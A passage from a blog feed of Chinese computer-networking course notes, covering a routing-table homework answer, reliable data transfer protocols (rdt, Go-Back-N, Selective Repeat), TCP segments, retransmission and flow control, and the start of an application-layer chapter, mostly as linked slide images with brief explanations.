0.0.0.0，下一跳是E</p></li><li><p>5E.43.91.12 和(3)类似，下一跳是E</p></li><li><p>C4.6D.31.2E8是1000，D是1101，对于第二条路由第14位不匹配，因此只能匹配第三条路由，下一跳是C</p></li><li><p>C4.6B.31.2E8是1000，B是1011，前十四位与第二条路由匹配，下一跳是D</p></li></ol><p>事实上，为了更加有效地查找最长前缀匹配，通常将无分类编址的路由表存放在一种层次式数据结构中，然后自上而下地按层次进行查找。这里最常用的数据结构就是二叉线索。所以以2为例真实的查找方式是发现C4.50.0.0/12 匹配，查看孩子节点是否匹配，发现没有匹配的，则下一跳为A</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>寄网-传输层</title>
    <link href="/posts/6389/"/>
    <url>/posts/6389/</url>
    
    <content type="html"><![CDATA[<h1 id="寄网-传输层">寄网-传输层</h1><h2 id="udp">UDP</h2><h3 id="特点">特点</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210157758684_494_20221102112829451012_857_image-20221019101254797.png" alt="image-20221019101254797"><figcaption aria-hidden="true">image-20221019101254797</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210159265810_142_20221102112833830874_553_image-20221019102904831.png" alt="image-20221019102904831"><figcaption aria-hidden="true">image-20221019102904831</figcaption></figure><blockquote><p>D</p></blockquote><h3 id="复用分用">复用分用</h3><div class="note note-info">如何理解复用和分用？</div><p>复用就是多个应用层进程汇聚成一个传输层进程（八车道变一车道）</p><p>分用就是反过来，传输层的多个进程相应的通向多个应用层进程（单车道变八车道）</p><p>通常复用针对发送，分用针对接收。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210200319520_306_20221102112836012813_910_image-20221019101337529.png" alt="image-20221019101337529"><figcaption aria-hidden="true">image-20221019101337529</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210201761353_804_20221102112841055514_461_image-20221019104559718.png" alt="image-20221019104559718"> &gt; B</p><h3 id="报文结构和校验">报文结构和校验</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210202885968_763_20221102112842251316_209_image-20221019102648654.png" alt="image-20221019102648654"><figcaption aria-hidden="true">image-20221019102648654</figcaption></figure><p><font color="Apricot">算校验和的时候别忘了进位</font></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210206252548_468_20221102112844925605_254_image-20221019101834126.png" alt="image-20221019101834126"><figcaption aria-hidden="true">image-20221019101834126</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210207702071_809_20221102112847899571_967_image-20221019102038599.png" alt="image-20221019102038599"><figcaption aria-hidden="true">image-20221019102038599</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210209127950_658_20221102112851148719_202_image-20221019101153691.png" alt="image-20221019101153691"><figcaption aria-hidden="true">image-20221019101153691</figcaption></figure><blockquote><p>B：长度包含头部，但不包含伪首部</p></blockquote><p>最重要的“为什么”部分：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210210186747_533_20221102112852360163_657_image-20221019102522221.png" alt="image-20221019102522221"><figcaption aria-hidden="true">image-20221019102522221</figcaption></figure><h3 id="应用">应用</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210211518101_390_20221102112854071267_984_image-20221019103901732.png" alt="image-20221019103901732"><figcaption aria-hidden="true">image-20221019103901732</figcaption></figure><h2 id="可靠数据传输">可靠数据传输</h2><h3 id="目标">目标</h3><p>左边是希望对上层达到的抽象，右边是实际的情况。<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210212743134_565_20221102112856140137_289_image-20221019161257579.png" alt="image-20221019161257579"></p><h3 id="设计思路">设计思路</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210214194976_298_20221102112857352548_948_image-20221019162323429.png" alt="image-20221019162323429"><figcaption aria-hidden="true">image-20221019162323429</figcaption></figure><h4 id="rdt1.0">rdt1.0</h4><p>考虑最简单的情况，即底层信道是完全可靠的：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210215423897_929_20221102112900136029_437_image-20221019162337067.png" alt="image-20221019162337067"><figcaption aria-hidden="true">image-20221019162337067</figcaption></figure><p>发送端：打包数据，直接调用底层信道进行传输；</p><p>接收端：拆包，将数据交给上层应用</p><h4 id="rdt2.0">rdt2.0</h4><p>下层通道可能造成某些位出现错误（如:1变0，0变1)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210216697485_473_20221102112902564743_320_image-20221019163254576.png" alt="image-20221019163254576"><figcaption aria-hidden="true">image-20221019163254576</figcaption></figure><p class="note note-secondary">缩写：ACKnowledge character；Not AcKnowledge character肯定确认和否定确认。 同时为简便直白，对于package的翻译，用包代替分组</p><h5 id="发送端">发送端：</h5><p>仅当接收到ACK并离开该状态时才能发生rdt_send()事件。因此，在发送方确信接收方已正确接收当前分组之前肯定不会发送新数据。由于这种行为，rdt2.0这样的协议被称为停等(stop-and-wait)协议。</p><h5 id="接收端">接收端：</h5><p>上面表示如果packet受损发送NAK，下面表示如果package正确向上层传送数据并发送ACK</p><h5 id="存在的问题">存在的问题：</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210220358453_867_20221102112906743219_237_image-20221019164147811.png" alt="image-20221019164147811"><figcaption aria-hidden="true">image-20221019164147811</figcaption></figure><h4 id="rdt2.1">rdt2.1</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210221503147_107_20221102112909502820_948_image-20221019165240189.png" alt="image-20221019165240189"><figcaption aria-hidden="true">image-20221019165240189</figcaption></figure><p>答案是只需要1bit。因为如果发送端交替发送01包，接收端只需要知道收到的包是最近收到的(序号没变)还是新的(序号变了)。</p><p>按照这样的思路状态机如下：</p><p>发送端就是每当收到正确且是ACK的包的时候就准备发下一个，否则收到的是受损包或NAK就重发。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210222750499_102_20221102112911602268_247_image-20221019170813474.png" alt="image-20221019170813474"><figcaption aria-hidden="true">image-20221019170813474</figcaption></figure><p>接收端：等待接受状态上面部分是发现包受损发NAK且等待，发现和上一次收到的包重复就发ACK(以让发送端发下一个包)，然后等待，也是什么也不做，不向下层传输信息(丢数据)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210223884558_833_20221102112913795898_163_image-20221019171058350.png" alt="image-20221019171058350"><figcaption aria-hidden="true">image-20221019171058350</figcaption></figure><p>还有，接受端收到受损包其实不需要发NAK，再发一次上一次正确接收的ACK，发送端发现收到了对同一个包的两个ACK就知道接收端没正确接收这个包。</p><p>这其实就是rdt2.2</p><h4 id="rdt2.2">rdt2.2</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210225249292_703_20221102112917959019_890_image-20221019171614203.png" alt="image-20221019171614203"><figcaption aria-hidden="true">image-20221019171614203</figcaption></figure><p>在前面的基础上，看懂这种情况下的状态机就不再困难了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210226309404_749_20221102112919789535_361_image-20221019183702448.png" alt="image-20221019183702448"><figcaption aria-hidden="true">image-20221019183702448</figcaption></figure><p>接收端的主要变化是：在ACk中添加最后收到的包的序列和号，对应<code>make_pkt</code>第二个参数。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210228179719_902_20221102112923670147_103_image-20221019184436444.png" alt="image-20221019184436444"><figcaption aria-hidden="true">image-20221019184436444</figcaption></figure><h4 id="rdt3.0">rdt3.0</h4><h5 id="方案">方案：</h5><p>解决的问题：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210229596705_545_20221102112929819897_715_image-20221019185155113.png" alt="image-20221019185155113"><figcaption aria-hidden="true">image-20221019185155113</figcaption></figure><p>添加了计时器的发送端：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210231463399_658_20221102112931855615_706_image-20221019185225064.png" alt="image-20221019185225064"><figcaption aria-hidden="true">image-20221019185225064</figcaption></figure><p>接收端不需要改变。因为在2.3中已经实现了判断重复并丢弃了。</p><h5 id="实例">实例</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210232766290_806_20221102112933551292_417_image-20221019185429262.png" alt="image-20221019185429262"><figcaption aria-hidden="true">image-20221019185429262</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210233916080_286_20221102112937343229_422_image-20221019185440433.png" alt="image-20221019185440433"><figcaption aria-hidden="true">image-20221019185440433</figcaption></figure><p class="note note-primary">失序问题(二义性)是不能解决的，如下图所示</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210235178490_197_20221102112939258493_256_image-20221026092203952.png" alt="image-20221026092203952" width="67%" height="67%"></p><p>如果是上述情况，接收端不能辨别是重传的pkt1还是想要的pkt1.</p><p class="note note-primary">怎么解决？wifi用的是停等协议(和rdt3.0一样)，加入标志位表明是否是重传的包。如果接收端发现是接受过的，丢弃。但对于tcp性能优化后，就需要增加序号字段宽度</p><h3 id="流水线可靠数据传输">流水线可靠数据传输</h3><h4 id="停等协议的性能问题">停等协议的性能问题</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210236606641_276_20221102112941284045_123_image-20221019185844985.png" alt="image-20221019185844985"><figcaption aria-hidden="true">image-20221019185844985</figcaption></figure><p>发送时间相比传输时间是极短的</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210237714669_996_20221102112942732666_577_image-20221019185852269.png" alt="image-20221019185852269"><figcaption aria-hidden="true">image-20221019185852269</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210241006358_952_20221102112946369564_281_image-20221019185917983.png" alt="image-20221019185917983"><figcaption aria-hidden="true">image-20221019185917983</figcaption></figure><h4 id="流水线协议">流水线协议</h4><h5 id="go-back-ngbn">Go-Back-N(GBN)</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210242352943_108_20221102112949459658_238_image-20221019190539995.png" alt="image-20221019190539995"><figcaption aria-hidden="true">image-20221019190539995</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210243518309_802_20221102112952032314_240_image-20221019190656995.png" alt="image-20221019190656995"><figcaption aria-hidden="true">image-20221019190656995</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210245072105_715_20221102112956234191_425_image-20221019190714367.png" alt="image-20221019190714367"><figcaption aria-hidden="true">image-20221019190714367</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210246172681_424_20221102113000887288_715_image-20221019190525409.png" alt="image-20221019190525409"><figcaption aria-hidden="true">image-20221019190525409</figcaption></figure><p>GBN协议看起来很浪费，因为它会丢弃一个正确接收（但失序）的包。但这样做是有道理的。因为数据必须按序交付。接收方可能缓存包n + 1，但是，根据 GBN 重传规则，如果包 n 丢失，则这个包及第n +1及之后的包迟早会再重传，所以，接收方只需要直接丢弃第n + 1个包即可。</p><p>这种方法的优点是<strong>接收方不需要缓存任何失序分组</strong>，<strong>唯一需要维护的信息就是下一个按序接收的分组的序号</strong>。缺点就是<strong>随后对该分组的重传也许会丢失或出错，进而引发更多的重传。</strong></p><h5 id="sr">SR</h5><p>与GBN的主要区别：</p><ul><li><p>发送端：</p><ul><li><p>每个分组必须拥有其自己的逻辑定时器，因为超时发生后只能发送一个包。</p></li><li><p>记录收到的ACK(因为不再重复发送)，但仅当收到的ACK的序号等于基序号<code>base</code>时窗口才会移动，移动到最小的未确认分组处(接收到的最大ACK+1)</p></li></ul></li><li><p>接收端</p><ul><li><p>收到没收到过的包，在窗口口内，缓存并发ACK这个包的序号。(没收到的包在窗口外那肯定是接收端缓存放不下了)</p></li><li><p>收到已经收到过的包，也发这个包的ACK。</p></li></ul></li></ul><p class="note note-primary">第二种情况是什么情景？收到已经收到过的包，那么只有一种情况，那就是接收端的ACK丢失，发送端不知道接收端这个包已经接受了，认为是中途丢了，就会再发一次。为什么要返回 ACK？加入按照上图中所示的发送方和接收方的序号空间，如果分组 send_base 的 ACK没有从接收方传播回发送方，则发送方最终将重传分组send_base，即使显然接收方已经收了该分组。如果接收方不确认该分组，则发送方窗口将永远不能向前滑动。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210248714116_152_20221102113003951000_939_image-20221026102125865.png" alt="image-20221026102125865"><figcaption aria-hidden="true">image-20221026102125865</figcaption></figure><p>然而，SR还是没解决类似的失序问题(虽然产生原因不一样，但导致的后果是一样的，即二义性)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210250133679_768_20221102113005960023_920_image-20221026102907586.png" alt="image-20221026102907586"><figcaption aria-hidden="true">image-20221026102907586</figcaption></figure><p>我们能够直观的感觉到，只要<strong>序号空间应大于等于窗口大小的2倍</strong>，就能“错开”潜在的二义性区间。</p><h3 id="tcp">TCP</h3><h4 id="段格式">段格式</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210251523006_419_20221102113010320175_456_image-20221028201125789.png" alt="image-20221028201125789"><figcaption aria-hidden="true">image-20221028201125789</figcaption></figure><p class="note note-info">报头长度为20~60B，其中固定部分为20B。由于数据偏移字段的单位是4B，也就是说当偏移取最大时TCP首部长度为15×4=60B。</p><h4 id="连接管理">连接管理</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210252765508_376_20221102113012417879_161_image-20221028202938399.png" alt="image-20221028202938399"><figcaption aria-hidden="true">image-20221028202938399</figcaption></figure><blockquote><p>B</p></blockquote><p>关于连接的建立和释放(三次握手，四次挥手)等内容，在实验作业中有详细的阐述。</p><p><a target="_blank" href="https://lunaticsky-tql.github.io/posts/13596/" style="position: relative; display: -webkit-box; display: -webkit-flex; display: -ms-flexbox; display: flex; box-sizing: border-box; -webkit-flex-direction: row; -ms-flex-direction: row; flex-direction: row; -webkit-align-items: center; -webkit-box-align: center; -ms-flex-align: center; align-items: center; width: 390px; min-height: 84px; border-radius: 8px; max-width: 100%; overflow: hidden; margin: 16px auto; padding: 12px 12px 9px 12px; background-color: #F6F6F6;"><span class="LinkCard-contents"><span style="display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; text-overflow: ellipsis; max-height: 40px; line-height: 1.25; color: #121212;">Wireshark分析交互过程</span><span style="display: -webkit-box; font-size: 13px; height: 18px; line-height: 18px; color: #999; word-break: break-all; text-overflow: ellipsis; overflow: hidden; -webkit-line-clamp: 1; -webkit-box-orient: vertical;"><span style="display: inline-flex; align-items: center;"><svg class="Zi Zi--InsertLink" fill="currentColor" viewBox="0 0 24 24" width="14" height="14"><path d="M13.414 4.222a4.5 4.5 0 1 1 6.364 6.364l-3.005 3.005a.5.5 0 0 1-.707 0l-.707-.707a.5.5 0 0 1 0-.707l3.005-3.005a2.5 2.5 0 1 0-3.536-3.536l-3.005 3.005a.5.5 0 0 1-.707 0l-.707-.707a.5.5 0 0 1 0-.707l3.005-3.005zm-6.187 6.187a.5.5 0 0 1 .638-.058l.07.058.706.707a.5.5 0 0 1 .058.638l-.058.07-3.005 3.004a2.5 2.5 0 0 0 3.405 3.658l.13-.122 3.006-3.005a.5.5 0 0 1 .638-.058l.069.058.707.707a.5.5 0 0 1 .058.638l-.058.069-3.005 3.005a4.5 4.5 0 0 1-6.524-6.196l.16-.168 3.005-3.005zm8.132-3.182a.25.25 0 0 1 .353 0l1.061 1.06a.25.25 0 0 1 0 .354l-8.132 8.132a.25.25 0 0 1-.353 0l-1.061-1.06a.25.25 0 0 1 0-.354l8.132-8.132z"></path></svg></span><span>https://lunaticsky-tql.github.io/posts/13596/</span></span></span></a></p><h4 id="传输过程">传输过程</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210257648366_404_20221102113015046715_418_image-20221028202640029.png" alt="image-20221028202640029"><figcaption aria-hidden="true">image-20221028202640029</figcaption></figure><p>对于某一端来说，seq表示发送的报文段中数据部分的第一个字节在其发送缓存区中的编号，<font color="Apricot">ack表示它期望收到的下一个报文段的数据部分的第一个字节在另一端的发送缓存区中的编号</font>。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210259152645_216_20221102113021254308_149_image-20221028202202650.png" alt="image-20221028202202650"><figcaption aria-hidden="true">image-20221028202202650</figcaption></figure><blockquote><p>同一个TCP报文中的seq和ack的值是没有联系。在B发给A的报文（捎带确认）中，seq值应和A发向B的报文中的ack值相同，即201：ack值表示B期望下次收到A发出的报文段的第一个字节的编号，应是200+2=202。</p></blockquote><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210300169798_848_20221102113022900814_335_image-20221028203537641.png" alt="image-20221028203537641"><figcaption aria-hidden="true">image-20221028203537641</figcaption></figure><blockquote><p>D</p></blockquote><h4 id="重传场景">重传场景</h4><h5 id="超时重传">超时重传</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210302309377_877_20221102113025521130_952_image-20221102090515967.png" alt="image-20221102090515967"><figcaption aria-hidden="true">image-20221102090515967</figcaption></figure><h6 id="rto设置重要性">RTO设置重要性</h6><p>RTO设置过大，对于丢失的报文段重传等待的时间过长，对于应用来说会引入较大的时延</p><p>RTO设置过小，可能会提前超时，引入不必要的重传，浪费带宽资源</p><h6 id="算法思路">算法思路</h6><p>最新样本赋予的权值大于老样本的权值（老化算法）</p><p>越新的样本越能更好地反映网络的当前状况</p><p>不仅如此，在实际情况中，网络拥塞情况会对网络时延有很大影响(体现在下面的DevRTT中)</p><p>启发式算法：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210303503113_832_20221102113027424562_662_image-20221102090928397.png" alt="image-20221102090928397"><figcaption aria-hidden="true">image-20221102090928397</figcaption></figure><h5 id="快速重传">快速重传</h5><p>“事不过三”。如果收到重复ACK，至少说明客户端接收到的包失序了。如果一两个，可能只是包跑的不一样快，但多了就认为很有可能是丢了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210304660072_706_20221102113029523742_128_image-20221102091321589.png" alt="image-20221102091321589"><figcaption aria-hidden="true">image-20221102091321589</figcaption></figure><h4 id="流量控制">流量控制</h4><h5 id="滑动窗口">滑动窗口</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210305919935_520_20221102113031785988_286_image-20221102102355905.png" alt="image-20221102102355905"><figcaption aria-hidden="true">image-20221102102355905</figcaption></figure><p class="note note-primary">如果上图中黄×所在的ACK没收到咋办？会出现什么情况？如何解决？</p><p>服务器不知道</p><blockquote><p>TCP使用滑动窗口机制来进行流量控制，其窗口尺寸的设置很重要，如果滑动窗口值设置得太小，那么会产生过多的ACK(因为窗口大可以累积确认，因此会有更少的ACK)，影响网络吞吐率；如果设置得太大，那么又会由于传送的数据过多而使路由器变得拥挤，浪费主机的存储资源，导致主机可能丢失分组。</p></blockquote><h5 id="性能问题image-20221102100002266">性能问题<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210307285438_328_20221102113034340991_595_image-20221102100002266.png" alt="image-20221102100002266"></h5>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>寄网-应用层</title>
    <link href="/posts/31769/"/>
    <url>/posts/31769/</url>
    
    <content type="html"><![CDATA[<h2 id="第一章">第一章</h2><h3 id="一些基本概念">一些基本概念</h3><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211236819148_796_20221026090215966691_917_image-20220921102100658.png" alt="image-20220921102100658"> <span class="math display">\[\frac{640*480*3}{1024}=900\text{KB}\]</span></p><h3 id="internet边缘与核心">Internet边缘与核心</h3><h4 id="电路交换">电路交换</h4><h5 id="时分和频分多路复用">时分和频分多路复用</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211237908762_469_20221026090217080225_394_image-20220921091644435.png" alt="image-20220921091644435"><figcaption aria-hidden="true">image-20220921091644435</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211239260101_820_20221026090219745396_605_image-20220914113833784.png" alt="image-20220914113833784" width="50%" height="50%"></p><h5 id="报文分组交换">报文分组交换</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211240617235_875_20221026090222052725_480_image-20220921090426643.png" alt="image-20220921090426643"><figcaption aria-hidden="true">image-20220921090426643</figcaption></figure><p>”谁来用谁,满了就丢“（当然刚满的时候有临时缓存）</p><p class="note note-secondary">由于成本问题，广域网带宽往往比局域网小得多。</p><p>问题：因为有排队现象，延迟大</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211242172177_624_20221026090236334011_832_image-20220921091804148.png" alt="image-20220921091804148"><figcaption aria-hidden="true">image-20220921091804148</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211245205712_132_20221026090239402715_311_image-20220921092457252.png" alt="image-20220921092457252"><figcaption aria-hidden="true">image-20220921092457252</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211252077183_381_20221026090242065298_766_image-20220921102342289.png" alt="image-20220921102342289"><figcaption aria-hidden="true">image-20220921102342289</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211254458093_810_20221026090244516116_167_image-20220921102115526.png" alt="image-20220921102115526"><figcaption aria-hidden="true">image-20220921102115526</figcaption></figure><p>题中是Mb不是MB。别忘了字节和bit的转换，正确答案是C。</p><h4 id="传输时延">传输时延</h4><p><font color="Apricot">别忘了RTP的定义</font></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211255677100_921_20221026090246765227_486_image-20221012101652816.png" alt="image-20221012101652816"><figcaption aria-hidden="true">image-20221012101652816</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211256918228_272_image-20221115202145242.png" alt="image-20221115202145242"><figcaption aria-hidden="true">image-20221115202145242</figcaption></figure><h3 id="web服务器访问示例">Web服务器访问示例</h3><p>网络体系结构概览，理解。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211258149168_184_20221026090248226957_689_image-20220921135514064.png" alt="image-20220921135514064"><figcaption aria-hidden="true">image-20220921135514064</figcaption></figure><h2 id="第二章">第二章</h2><h3 id="应用层协议和进程通信模型">应用层协议和进程通信模型</h3><h4 id="进程通信模型">进程通信模型</h4><p class="note note-primary"></p><p>进程之间如何通信？</p>1.管道 2.共享内存 3.消息队列<p></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211301020358_123_20221026090249957055_679_image-20220928093225868.png" alt="image-20220928093225868"><figcaption aria-hidden="true">image-20220928093225868</figcaption></figure><p class="note note-info">C/S模型的缺陷：如果访问量大的时候，会影响服务质量，甚至会导致中心服务器瘫痪P2P模型缺陷：不便于管理</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211306273537_209_20221026090255703101_824_image-20221012092450719.png" alt="image-20221012092450719"><figcaption aria-hidden="true">image-20221012092450719</figcaption></figure><p>D。客户机面向用户。其实主要注意C是对的</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211307832872_485_20221026090257212133_865_image-20221012112533931.png" alt="image-20221012112533931"><figcaption aria-hidden="true">image-20221012112533931</figcaption></figure><figure><img 